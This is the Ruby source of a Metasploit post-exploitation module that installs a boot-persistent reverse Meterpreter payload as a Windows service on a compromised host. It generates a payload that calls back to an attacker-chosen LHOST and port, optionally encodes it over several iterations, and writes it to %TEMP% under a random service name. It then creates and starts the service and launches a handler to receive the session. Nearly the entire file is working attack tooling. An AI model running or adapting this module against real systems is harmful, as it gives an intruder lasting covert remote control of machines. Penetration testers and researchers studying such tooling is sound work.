#
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Persistent Payload as a Service Installer',
			'Description'   => %q{
				This Module will create a boot persistent reverse Meterpreter session by
				installing on the target host the payload as a service.

				REXE mode will transfer a binary of your choosing to remote host to be
				used as a payload.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Carlos Perez <carlos_perez[at]darkoperator.com>'
				],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptAddress.new('LHOST', 	[true, 'IP for persistent payload to connect to.']),
				OptInt.new('LPORT', 		[true, 'Port for persistent payload to connect to.']),
				OptBool.new('HANDLER', 		[ false, 'Start a Multi/Handler to Receive the session.', true]),
				OptString.new('TEMPLATE', 	[false, 'Alternate template Windows Service PE File to use.']),
				OptString.new('EXE',		[false, 'Existing Windows Service PE to use instead of generating one.','']),
				OptString.new('SRV_NAME',	[false, 'Name for the service (Single word, do not include spaces or special charecters.).','']),
				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
			], self.class)

		register_advanced_options(
			[
				OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",""]),
				OptString.new('ENCODER', [false, "Encoder name to use for encoding.",]),
				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.']),
			], self.class)
	end

	# Run Method for when run command is issued
	#-------------------------------------------------------------------------------
	def run
		print_status("Running module against #{sysinfo['Computer']}")

		# Set vars
	
		lhost = datastore['LHOST']
		lport = datastore['LPORT']
		opts = datastore['OPTIONS']
		encoder = datastore['ENCODER']
		iterations = datastore['ITERATIONS']
		host,port = session.session_host, session.session_port
		if datastore['SRV_NAME'] == ''
			srvname = Rex::Text.rand_text_alpha(rand(8)+8)
		else
			srvname = datastore['SRV_NAME']
		end
		@clean_up_rc = ""
		payload = "windows/meterpreter/reverse_tcp"

		
		# Check that if a template is provided that it actually exists
		if not datastore['TEMPLATE'].nil?
			if not ::File.exists?(datastore['TEMPLATE'])
				print_error "Template PE File does not exists!"
				return
			else
				template_pe = datastore['TEMPLATE']
			end
		end

		# Set the proper payload
		case datastore['PAYLOAD_TYPE']
		when /TCP/i
			payload = "windows/meterpreter/reverse_tcp"
		when /HTTP/i
			payload = "windows/meterpreter/reverse_http"
		when /HTTPS/i
			payload = "windows/meterpreter/reverse_https"
		end

		# Create payload
		if datastore['EXE'].nil? or datastore['EXE'].empty?
			pay = create_payload(payload, lhost, lport, opts = "")
			raw = pay_gen(pay,encoder, iterations)
			srv_exe = create_exe(template_pe, raw, srvname)
		else
			if not ::File.exists?(datastore['EXE'])
				print_error "Service PE File does not exists!"
				return
			else
				srv_exe =  ::IO.read(datastore['EXE'])
			end
		end
		exe_on_target = write_exe_to_target(srv_exe, srvname)
		


		# Start handler if set
		create_multihand(payload, lhost, lport) if datastore['HANDLER']

		install_as_service(exe_on_target, srvname)

		clean_rc = log_file()
		file_local_write(clean_rc,@clean_up_rc)
		print_status("Cleanup Meterpreter RC File: #{clean_rc}")

		report_note(:host => host,
			:type => "host.persistance.cleanup",
			:data => {
				:local_id => session.sid,
				:stype => session.type,
				:desc => session.info,
				:platform => session.platform,
				:via_payload => session.via_payload,
				:via_exploit => session.via_exploit,
				:created_at => Time.now.utc,
				:commands =>  @clean_up_rc
			}
		)
		print_status("Starting service")
		service_start(srvname)
	end
	

	# Method for checking if a listener for a given IP and port is present
	# will return true if a conflict exists and false if none is found
	#-------------------------------------------------------------------------------
	def check_for_listner(lhost,lport)
		conflict = false
		client.framework.jobs.each do |k,j|
			if j.name =~ / multi\/handler/
				current_id = j.jid
				current_lhost = j.ctx[0].datastore["LHOST"]
				current_lport = j.ctx[0].datastore["LPORT"]
				if lhost == current_lhost and lport == current_lport.to_i
					print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
					conflict = true
				end
			end
		end
		return conflict
	end

	# Starts a multi/handler session
	#-------------------------------------------------------------------------------
	def create_multihand(payload,lhost,lport)
		pay = session.framework.payloads.create(payload)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		print_status("Starting exploit multi handler")
		if not check_for_listner(lhost,lport)
			# Set options for module
			mul = session.framework.exploits.create("multi/handler")
			mul.share_datastore(pay.datastore)
			mul.datastore['WORKSPACE'] = client.workspace
			mul.datastore['PAYLOAD'] = payload
			mul.datastore['EXITFUNC'] = 'thread'
			mul.datastore['ExitOnSession'] = false
			# Validate module options
			mul.options.validate(mul.datastore)
			# Execute showing output
			mul.exploit_simple(
					'Payload'     => mul.datastore['PAYLOAD'],
					'LocalInput'  => self.user_input,
					'LocalOutput' => self.user_output,
					'RunAsJob'    => true
				)
		else
			print_error("Could not start handler!")
			print_error("A job is listening on the same Port")
		end
	end


	# Function to install payload as a service
	#-------------------------------------------------------------------------------
	def install_as_service(exe_on_target, srv_name)
		if  is_system? or is_admin?
			print_status("Creating service #{srv_name}")
			service_create(srv_name, srv_name, "cmd /c \"#{exe_on_target}\"") 

			@clean_up_rc << "execute -H -f sc -a \"delete #{srv_name}\"\n"
		else
			print_error("Insufficient privileges to create service")
		end
	end


	# Function for writing executable to target host
	#-------------------------------------------------------------------------------
	def write_exe_to_target(exe, rexename)
		tempdir = session.fs.file.expand_path("%TEMP%")
		tempexe = tempdir + "\\" + rexename + ".exe"
		fd = session.fs.file.new(tempexe, "wb")
		fd.write(exe)
		fd.close
		print_good("Service EXE written to #{tempexe}")
		@clean_up_rc << "rm #{tempexe}\n"
		return tempexe
	end

	def create_payload_from_file(exec)
		print_status("Reading Payload from file #{exec}")
		return ::IO.read(exec)
	end

	# Function for Creating persistent script
	#-------------------------------------------------------------------------------
	def create_exe(altexe, raw, srvname)
		if not altexe.nil?
			exe = ::Msf::Util::EXE.to_win32pe_service(session.framework, raw, {:servicename => srvname, :template => altexe})
		else
			exe = ::Msf::Util::EXE.to_win32pe_service(session.framework, raw, {:servicename => srvname})
		end
		return exe
	end
	# Generate raw payload
	#-------------------------------------------------------------------------------
	def pay_gen(pay,encoder, iterations)
		raw = pay.generate
		if encoder
			if enc_compat(pay, encoder)
				print_status("Encoding with #{encoder}")
				enc = framework.encoders.create(encoder)
				(1..iterations).each do |i|
					print_status("\tRunning iteration #{i}")
					raw = enc.encode(raw, nil, nil, "Windows")
				end
			end
		end
		return raw
	end

	# Check if encoder specified is in the compatible ones
	#
	# Note: This should allow to adapt to new encoders if they appear with out having
	# to have a static whitelist.
	#-------------------------------------------------------------------------------
	def enc_compat(payload, encoder)
		compat = false
		payload.compatible_encoders.each do |e|
			if e[0] == encoder.strip
				compat = true
			end
		end
		return compat
	end

	# Create a payload given a name, lhost and lport, additional options
	#-------------------------------------------------------------------------------
	def create_payload(name, lhost, lport, opts = "")

		pay = session.framework.payloads.create(name)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		if not opts.empty?
			opts.split(",").each do |o|
				opt,val = o.split("=", 2)
				pay.datastore[opt] = val
			end
		end
		# Validate the options for the module
		pay.options.validate(pay.datastore)
		return pay

	end
# Function for creating log folder and returning log path
	#-------------------------------------------------------------------------------
	def log_file(log_path = nil)
		#Get hostname
		host = session.sys.config.sysinfo["Computer"]

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		else
			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
		return logfile
	end


end